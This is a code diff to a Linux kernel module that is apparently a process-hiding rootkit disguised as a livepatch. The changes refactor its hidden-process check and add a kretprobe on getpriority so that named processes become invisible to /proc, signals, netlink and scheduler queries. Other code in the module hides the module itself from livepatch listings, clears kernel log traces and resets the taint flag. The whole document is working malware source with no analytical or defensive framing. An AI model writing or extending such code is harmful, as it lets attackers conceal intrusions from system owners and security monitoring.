@@ -28,6 +28,7 @@
 #include <linux/dynamic_debug.h>
 #include <linux/audit.h>
 #include <linux/string.h>
+#include <linux/kprobes.h>
 #include "ftrace_hook.h"
 
 
@@ -93,7 +94,6 @@ static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm",};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 static char exe_buf[PATH_MAX] = {0};
 
-
 static char hidden_msg_klog[] = "hidden_proc";
 static char **p_log_buf = NULL;
 static raw_spinlock_t *p_logbuf_lock = NULL;
@@ -145,6 +145,9 @@ static int (*p_group_send_sig_info)(int sig, struct kernel_siginfo *info,
 
 static int (*p_security_task_getpgid)(struct task_struct *p) = NULL;
 static struct task_struct * (*p_find_task_by_vpid)(pid_t vnr) = NULL;
+
+static void (*p_free_uid)(struct user_struct *up) = NULL;
+static struct user_struct *(*p_find_user)(kuid_t uid) = NULL;
 
 static rwlock_t *p_tasklist_lock = NULL;
 
@@ -200,9 +203,10 @@ end:
 	return 0;
 }
 
-static int is_hidden_proc(struct task_struct *task) 
+static int is_hidden_proc(struct task_struct *task, pid_t pid) 
 {
 	int ret = 0;
+
 	if (hidden_base_exe) {
 		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
 			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
@@ -213,6 +217,27 @@ static int is_hidden_proc(struct task_struct *task)
 			ret = 1;
 	}
 
+	return ret;
+}
+
+static int is_hidden_proc_pid(pid_t pid) 
+{
+        struct task_struct *task = NULL;
+	int ret = 0;
+
+        rcu_read_lock();
+	task = p_find_task_by_vpid(pid);
+        if (task)
+                get_task_struct(task);
+        rcu_read_unlock();
+        if (!task)
+                goto end;
+
+	if (is_hidden_proc(task , pid)) 
+		ret = 1;
+	put_task_struct(task);
+
+end:
 	return ret;
 }
 
@@ -236,18 +261,9 @@ static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned 
         if (!task)
                 goto out;
 
-	if (hidden_base_exe) {
-		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
-			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf))) {
-        			put_task_struct(task);
-				goto out;
-			}
-		}
-	} else {
-		if (is_hidden_proc_name(task->comm, sizeof(task->comm))) {
-        			put_task_struct(task);
-				goto out;
-		}
+	if (is_hidden_proc(task , tgid)) {
+		put_task_struct(task);
+		goto out;
 	}
 
         result = p_proc_pid_instantiate(dentry, task, NULL);
@@ -290,15 +306,8 @@ static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx
                 if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
                         continue;
 
-		if (hidden_base_exe) {
-			if (get_task_exe(exe_buf, sizeof(exe_buf), iter.task) > 0) {
-				if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
-					continue;
-			}
-		} else {
-			if (is_hidden_proc_name(iter.task->comm, sizeof(iter.task->comm)))
-				continue;
-		}
+		if (is_hidden_proc(iter.task, iter.tgid))
+			continue;
 
                 len = snprintf(name, sizeof(name), "%u", iter.tgid);
                 ctx->pos = iter.tgid + TGID_OFFSET;
@@ -502,15 +511,9 @@ static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group
         gfp_t gfp_mask)
 {
 	struct task_struct *task = current;
-	if (hidden_base_exe) {
-		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
-			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
-				return 0;
-		}
-	} else {
-		if (is_hidden_proc_name(task->comm, sizeof(task->comm)))
-			return 0;
-	}
+
+	if (is_hidden_proc(task, task->tgid))
+		return 0;
 
 	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
 }
@@ -527,7 +530,7 @@ static int livepatch_kill_pid_info(int sig, struct kernel_siginfo *info, struct 
 
 	rcu_read_lock();
 	p = pid_task(pid, PIDTYPE_PID);
-	if (p && is_hidden_proc(p) && sig != SIGKILL) {
+	if (p && is_hidden_proc(p, p->tgid) && sig != SIGKILL) {
 		rcu_read_unlock();
 		return error;
 	}
@@ -564,8 +567,14 @@ static int livepatch_do_getpgid(pid_t pid)
                 p = p_find_task_by_vpid(pid);
                 if (!p)
                         goto out;
-		if (is_hidden_proc(p))
-                        goto out;
+
+		get_task_struct(p);
+		if (is_hidden_proc(p, pid)) {
+			put_task_struct(p);
+			goto out;
+		}
+		put_task_struct(p);
+
                 grp = task_pgrp(p);
                 if (!grp)
                         goto out;
@@ -805,12 +814,6 @@ static void clear_klog(void)
 }
 
 #ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage int (*real_sys_getpriority) (struct pt_regs * regs) = NULL;
-static asmlinkage int ftrace_sys_getpriority(struct pt_regs *regs)
-{
-        return real_sys_getpriority(regs);
-}
-
 static asmlinkage long (*real_sched_getaffinity)(struct pt_regs *regs) = NULL;
 static asmlinkage long ftrace_sched_getaffinity(struct pt_regs *regs)
 {
@@ -830,38 +833,6 @@ static asmlinkage long ftrace_security_task_getsid(struct pt_regs *regs)
 }
 #else
 
-static asmlinkage int (*real_sys_getpriority) (int which, int who) = NULL;
-static asmlinkage int ftrace_sys_getpriority(int which, int who)
-{
-	struct task_struct *p = NULL;
-	int ret = 0;
-
-	rcu_read_lock();
-	if (which == PRIO_PROCESS && who > 0) {
-		//p = p_find_task_by_vpid(who);
-		printk(KERN_INFO "which:%d pid:%d", which, who);
-		#if 0
-		if (p)
-			get_task_struct(p); 
-		#endif
-
-
-		#if 0
-		if (p) {
-			if (is_hidden_proc(p))
-				ret = -ESRCH;
-			put_task_struct(p); 
-		}
-		#endif
-	}
-	rcu_read_unlock();
-	if (ret == -ESRCH)
-		return ret; 
-
-        return real_sys_getpriority(which, who);
-}
-
-
 static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
 static asmlinkage long ftrace_sched_getaffinity(pid_t pid, struct cpumask *mask)
 {
@@ -875,7 +846,7 @@ static asmlinkage long ftrace_sched_getaffinity(pid_t pid, struct cpumask *mask)
 	rcu_read_unlock();
 
 	if (p) {
-		if (is_hidden_proc(p))
+		if (is_hidden_proc(p, pid))
 			ret = -ESRCH;
 		put_task_struct(p); 
 	}
@@ -890,7 +861,7 @@ static asmlinkage int (*real_security_task_getscheduler)(struct task_struct *p) 
 static asmlinkage int ftrace_security_task_getscheduler(struct task_struct *p)
 {
 	if (p) {
-		if (is_hidden_proc(p))
+		if (is_hidden_proc(p, p->tgid))
 			return -ESRCH;
 	}
 
@@ -902,7 +873,7 @@ static asmlinkage int (*real_security_task_getsid)(struct task_struct *p) = NULL
 static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
 {
 	if (p) {
-		if (is_hidden_proc(p))
+		if (is_hidden_proc(p, p->tgid))
 			return -ESRCH;
 	}
 
@@ -911,12 +882,39 @@ static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
 #endif
 
 static struct ftrace_hook hooks[] = {
-        //HOOK("__x64_sys_getpriority", ftrace_sys_getpriority, &real_sys_getpriority),
         HOOK("sched_getaffinity", ftrace_sched_getaffinity, &real_sched_getaffinity),
         HOOK("security_task_getscheduler", ftrace_security_task_getscheduler, &real_security_task_getscheduler),
         HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
 };
 
+/* Here we use the entry_hanlder to timestamp function entry */
+static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        return 0;
+}
+
+static int ret_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        unsigned long retval = regs_return_value(regs);
+
+	//int which = (int) regs_get_kernel_argument(regs, 0);
+	pid_t who = (pid_t) regs_get_kernel_argument(regs, 1);
+
+	if (retval != (unsigned long)(-ESRCH)) {
+		if (is_hidden_proc_pid(who))
+			regs_set_return_value(regs, (unsigned long)(-ESRCH));
+	}
+
+        return 0;
+}
+
+static struct kretprobe krp = {
+		.kp.symbol_name = "__x64_sys_getpriority",
+		.handler        = ret_handler_sys_getpriority,
+		.entry_handler  = entry_handler_sys_getpriority,
+		.data_size      = 0,
+                .maxactive      = 20,
+};
 
 static struct klp_func funcs[] = {
 	{
@@ -950,7 +948,8 @@ static struct klp_func funcs[] = {
 	{
 		.old_name = "do_getpgid",
 		.new_func = livepatch_do_getpgid,
-	}, { }
+	}, 
+	{ }
 };
 
 static struct klp_object objs[] = {
@@ -1117,6 +1116,20 @@ static int livepatch_init(void)
 	if (!p_security_task_getpgid)
 		return -1;
 
+	p_free_uid = (void (*)(struct user_struct *up))
+				 kallsyms_lookup_name("free_uid");
+	if (!p_free_uid)
+		return -1;
+
+	p_tasklist_lock = (rwlock_t *) kallsyms_lookup_name("tasklist_lock");
+	if (!p_tasklist_lock)
+		return -1;
+
+	p_find_user = (struct user_struct *(*)(kuid_t uid))
+				 kallsyms_lookup_name("find_user");
+	if (!p_find_user)
+		return -1;
+
 	
 	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 
@@ -1127,6 +1140,8 @@ static int livepatch_init(void)
 		hidden_from_sys_livepatch(&patch);
 		hidden_from_enabled_functions(objs);
 	}
+	register_kretprobe(&krp);
+
 	restore_tainted_mask();
 
 	*p_modules_disabled = force_modules_disabled;
